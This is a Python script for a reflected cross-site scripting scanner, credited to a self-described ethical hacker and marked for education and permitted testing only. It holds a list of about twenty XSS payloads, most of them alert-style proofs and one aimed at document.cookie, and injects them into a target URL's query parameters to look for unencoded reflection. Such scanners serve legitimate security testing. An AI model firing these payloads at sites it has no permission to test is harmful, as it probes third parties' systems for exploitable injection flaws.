#!/usr/bin/env python3
# =====================================================
# XSS SCANNER - REFLECTED XSS DETECTOR
# Tool For Education Purpose Only
# This All Tools And Scripts Coded By 
# Pakistani Ethical Hacker Mr. Sabaz Ali Khan
# =====================================================
# WARNING: Use only on websites you own or have explicit permission to test.
# I am not responsible for any misuse. This is strictly for learning and ethical hacking.
# =====================================================

import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode

# Color codes for better output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def banner():
    print(f"""{YELLOW}
    ================================================
          XSS SCANNER - By Mr. Sabaz Ali Khan
    ================================================
    Educational Tool | Reflected XSS Detector
    ================================================{RESET}
    """)

# Common XSS payloads (more than 20 for better coverage)
PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(\"XSS\")</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert(1)>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<body onload=alert(1)>",
    "<input type='text' value='\"><script>alert(1)</script>'>",
    "javascript:alert(1)",
    "<script>alert(document.cookie)</script>",
    "<img src=\"javascript:alert(1)\">",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<video><source onerror=alert(1)></video>",
    "<audio src=x onerror=alert(1)>",
]

def xss_scanner(target_url):
    banner()
    print(f"{YELLOW}[*] Scanning URL: {target_url}{RESET}\n")
    
    parsed_url = urlparse(target_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    
    # Get query parameters
    if parsed_url.query:
        params = parse_qs(parsed_url.query)
    else:
        print(f"{RED}[-] No query parameters found. Adding test parameter for scanning.{RESET}")
        params = {"test": ["xss_test"]}
    
    if not params:
        print(f"{RED}[-] Cannot scan: No parameters to test.{RESET}")
        return
    
    vulnerable = False
    
    for param_name in params:
        print(f"{YELLOW}[*] Testing parameter: {param_name}{RESET}")
        
        for payload in PAYLOADS:
            # Create test parameters (replace original value with payload)
            test_params = params.copy()
            test_params[param_name] = [payload]
            
            # Build query string
            query_string = urlencode(test_params, doseq=True)
            test_url = f"{base_url}?{query_string}"
            
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }
                response = requests.get(test_url, headers=headers, timeout=8, allow_redirects=True)
                
                # Basic detection: Check if payload is reflected without proper encoding
                if payload.lower() in response.text.lower():
                    print(f"{GREEN}[+] VULNERABLE!{RESET}")
                    print(f"    Parameter : {param_name}")
                    print(f"    Payload   : {payload}")
                    print(f"    URL       : {test_url}")
                    print(f"    Status    : {response.status_code}\n")
                    vulnerable = True
                    
            except requests.exceptions.RequestException as e:
                print(f"{RED}[-] Request failed for payload: {payload[:30]}...{RESET}")
                continue
    
    if not vulnerable:
        print(f"{RED}[-] No obvious reflected XSS vulnerability detected with current payloads.{RESET}")
        print(f"{YELLOW}[!] Note: This is a basic scanner. For advanced detection (DOM-based, stored XSS), use tools like XSStrike or Burp Suite.{RESET}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"{RED}Usage: python xss_scanner.py <target_url>{RESET}")
        print(f"Example: python xss_scanner.py \"http://testphp.vulnweb.com/search.php?test=1\"")
        sys.exit(1)
    
    target = sys.argv[1]
    
    # Basic URL validation
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    
    try:
        xss_scanner(target)
    except KeyboardInterrupt:
        print(f"\n{RED}[-] Scan stopped by user.{RESET}")
    except Exception as e:
        print(f"{RED}[-] Unexpected error: {e}{RESET}")

# =====================================================
# Coded by Mr. Sabaz Ali Khan (Pakistani Ethical Hacker)
# For Education & Ethical Use Only
# =====================================================